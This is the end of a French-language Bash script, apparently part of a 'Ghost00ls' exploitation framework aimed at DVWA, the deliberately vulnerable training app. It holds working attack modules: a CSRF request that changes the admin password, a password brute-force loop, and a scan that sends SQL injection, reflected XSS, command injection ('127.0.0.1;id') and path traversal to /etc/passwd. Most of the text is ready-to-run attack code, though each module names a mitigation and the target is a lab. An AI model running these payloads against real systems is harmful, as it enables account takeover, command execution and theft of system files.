    echo -e "${CYAN}ğŸ“– Objectif : Forcer action non autorisÃ©e${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : Actions au nom de la victime${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : CSRF tokens${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    echo -e "\n${YELLOW}[AUTH] Authentification...${NC}"
    local result=$(login_form "${BASE}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)

    echo -e "${GREEN}[SUCCESS] AuthentifiÃ©${NC}"
    init_dvwa_session "$cookie_jar" "$BASE"

    echo -e "\n${YELLOW}[EXPLOIT] Test CSRF...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local new_pass="ghost$(date +%S)"
    local resp=$(curl -s -b "$cookie_jar" \
        "${BASE}/vulnerabilities/csrf/?password_new=${new_pass}&password_conf=${new_pass}&Change=Change")

    if echo "$resp" | grep -qi "password.*changed"; then
        echo -e "${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${GREEN}â•‘  âœ… CSRF SUCCESS !                    â•‘${NC}"
        echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

        log_exploit "${LOG_DIR}/csrf.log" "SUCCESS" "Password change"

        echo -e "\n${CYAN}ğŸ“Š Nouveau password: $new_pass${NC}"
    else
        echo -e "${RED}âŒ Protection CSRF active${NC}"
    fi

    cleanup_cookie_jar "$cookie_jar"
    
    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 7: Brute Force
# ==========================

exploit_bruteforce() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘       Brute Force - Login Attack          â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo -e "${CYAN}ğŸ“– Objectif : Casser mot de passe${NC}"
    echo -e "${YELLOW}âš ï¸  Risque : AccÃ¨s non autorisÃ©${NC}"
    echo -e "${GREEN}ğŸ›¡ï¸  Mitigation : Rate limiting, CAPTCHA${NC}"
    echo

    check_tools curl || { read -p "ğŸ‘‰ EntrÃ©e pour continuer... "; return; }

    local IP PORT BASE
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}
    BASE="http://${IP}:${PORT}"

    local passwords=("password" "admin" "123456" "letmein" "dvwa")

    echo -e "\n${YELLOW}[EXPLOIT] Brute Force...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local success=0
    local idx=1

    for pass in "${passwords[@]}"; do
        echo -e "${CYAN}[Test $idx/${#passwords[@]}] admin / $pass${NC}"

        local cookie_jar=$(create_cookie_jar)
        local login_page=$(curl -s -c "$cookie_jar" "${BASE}/login.php")
        local token=$(echo "$login_page" | grep -oP "user_token.*value='\K[^']+")

        if [ -n "$token" ]; then
            curl -s -b "$cookie_jar" -c "$cookie_jar" -L \
                -d "username=admin&password=$pass&Login=Login&user_token=$token" \
                "${BASE}/login.php" >/dev/null 2>&1
        else
            curl -s -b "$cookie_jar" -c "$cookie_jar" -L \
                -d "username=admin&password=$pass&Login=Login" \
                "${BASE}/login.php" >/dev/null 2>&1
        fi

        sleep 0.5

        local resp=$(curl -s -b "$cookie_jar" "${BASE}/index.php")

        if echo "$resp" | grep -qi "Logout\|Welcome.*admin"; then
            echo -e "\n${GREEN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
            echo -e "${GREEN}â•‘  âœ… BRUTE FORCE SUCCESS !             â•‘${NC}"
            echo -e "${GREEN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"

            log_exploit "${LOG_DIR}/bruteforce.log" "SUCCESS" "admin/$pass"

            echo -e "\n${CYAN}ğŸ“Š Credentials: admin / $pass${NC}"

            success=1
            cleanup_cookie_jar "$cookie_jar"
            break
        fi

        cleanup_cookie_jar "$cookie_jar"
        idx=$((idx+1))
    done

    [ $success -eq 0 ] && echo -e "\n${RED}âŒ Aucun password trouvÃ©${NC}"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# EXPLOIT 8: Full Scan
# ==========================

full_scan() {
    clear
    banner
    echo -e "${MAGENTA}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
    echo -e "${MAGENTA}â•‘         Full Vulnerability Scan            â•‘${NC}"
    echo -e "${MAGENTA}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
    echo

    local IP PORT
    IP=$(get_host_ip)

    read -p "ğŸŒ IP [$IP]: " input; IP=${input:-$IP}
    read -p "ğŸ”Œ Port [8081]: " PORT; PORT=${PORT:-8081}

    echo -e "\n${YELLOW}[SCAN] DÃ©marrage...${NC}"
    echo -e "${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}\n"

    local report="${LOG_DIR}/scan_$(date +%Y%m%d_%H%M%S).txt"

    {
        echo "â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—"
        echo "â•‘       DVWA Full Vulnerability Scan        â•‘"
        echo "â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo ""
        echo "Date: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Target: http://${IP}:${PORT}"
        echo "Scanner: Ghost00ls Framework v7.0"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo ""
    } | tee "$report"

    local result=$(login_form "http://${IP}:${PORT}/login.php" "admin" "password")
    local cookie_jar=$(echo "$result" | cut -d'|' -f1)
    init_dvwa_session "$cookie_jar" "http://${IP}:${PORT}"

    # Test 1: SQLi
    echo -e "${CYAN}[1/7] SQL Injection...${NC}" | tee -a "$report"
    local sqli=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/sqli/?id=1%27+OR+%271%27%3D%271&Submit=Submit")
    echo "$sqli" | grep -q "admin" && echo "   âœ… VULNERABLE" | tee -a "$report" || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 2: XSS
    echo -e "${CYAN}[2/7] XSS...${NC}" | tee -a "$report"
    local xss=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/xss_r/?name=%3Cscript%3E")
    echo "$xss" | grep -q "<script>" && echo "   âœ… VULNERABLE" | tee -a "$report" || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 3: Command Injection (POST)
    echo -e "${CYAN}[3/7] Command Injection...${NC}" | tee -a "$report"
    local cmd=$(curl -s -b "$cookie_jar" -X POST -d "ip=127.0.0.1;id&Submit=Submit" "http://${IP}:${PORT}/vulnerabilities/exec/")
    echo "$cmd" | grep -q "uid=" && echo "   âœ… VULNERABLE" | tee -a "$report" || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 4: LFI
    echo -e "${CYAN}[4/7] LFI...${NC}" | tee -a "$report"
    local lfi=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/fi/?page=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd")
    echo "$lfi" | grep -q "root:x:0" && echo "   âœ… VULNERABLE" | tee -a "$report" || echo "   âœ… PROTECTED" | tee -a "$report"

    # Test 5: CSRF
    echo -e "${CYAN}[5/7] CSRF...${NC}" | tee -a "$report"
    local csrf=$(curl -s -b "$cookie_jar" "http://${IP}:${PORT}/vulnerabilities/csrf/")
    echo "$csrf" | grep -q "user_token" && echo "   âœ… PROTECTED" | tee -a "$report" || echo "   âœ… VULNERABLE" | tee -a "$report"

    # Test 6-7
    echo -e "${CYAN}[6/7] File Upload...${NC}" | tee -a "$report"
    echo "   âš ï¸  MANUAL TEST" | tee -a "$report"
    echo -e "${CYAN}[7/7] Brute Force...${NC}" | tee -a "$report"
    echo "   âš ï¸  MANUAL TEST" | tee -a "$report"

    {
        echo ""
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
        echo "Scan terminÃ©: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "Rapport: $report"
        echo "â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•"
    } | tee -a "$report"

    cleanup_cookie_jar "$cookie_jar"

    echo
    echo -e "${GREEN}âœ… Scan terminÃ© !${NC}"
    echo -e "${CYAN}ğŸ“„ Rapport: $report${NC}"

    echo -e "\n${CYAN}â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”${NC}"
    read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
}

# ==========================
# Menu Principal
# ==========================

menu_exploits() {
    while true; do
        clear
        banner
        echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
        echo -e "${CYAN}â•‘               DVWA Exploits               â•‘${NC}"
        echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
        echo
        echo -e "${GREEN}1)  ğŸ”“ SQL Injection${NC}"
        echo -e "${GREEN}2)  ğŸ’‰ XSS Reflected${NC}"
        echo -e "${GREEN}3)  âš¡ Command Injection${NC}"
        echo -e "${GREEN}4)  ğŸ“¤ File Upload${NC}"
        echo -e "${GREEN}5)  ğŸ“‚ LFI (Local File Inclusion)${NC}"
        echo -e "${GREEN}6)  ğŸ” CSRF${NC}"
        echo -e "${GREEN}7)  ğŸ”¨ Brute Force${NC}"
        echo -e "${CYAN}8)  ğŸ” Full Scan${NC}"
        echo -e "${MAGENTA}9)  ğŸ“œ Logs${NC}"
        echo -e "${RED}0)  âŒ Retour${NC}"
        echo
        read -p "ğŸ‘‰ Choix : " choice

        case $choice in
            1) exploit_sqli ;;
            2) exploit_xss ;;
            3) exploit_cmdinj ;;
            4) exploit_upload ;;
            5) exploit_lfi ;;
            6) exploit_csrf ;;
            7) exploit_bruteforce ;;
            8) full_scan ;;
            9)
                clear
                banner
                echo -e "${CYAN}â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—${NC}"
                echo -e "${CYAN}â•‘              Logs d'Exploits               â•‘${NC}"
                echo -e "${CYAN}â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•${NC}"
                echo

                for log in "$LOG_DIR"/*.log; do
                    if [ -f "$log" ]; then
                        echo -e "${GREEN}â•â•â• $(basename "$log") â•â•â•${NC}"
                        tail -n 5 "$log"
                        echo
                    fi
                done

                if [ ! "$(ls -A $LOG_DIR/*.log 2>/dev/null)" ]; then
                    echo -e "${YELLOW}Aucun log trouvÃ©${NC}"
                fi

                read -p "ğŸ‘‰ EntrÃ©e pour continuer... "
                ;;
            0) return ;;
            *)
                echo -e "${RED}âŒ Choix invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==========================
# Point d'entrÃ©e
# ==========================

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    menu_exploits
fi
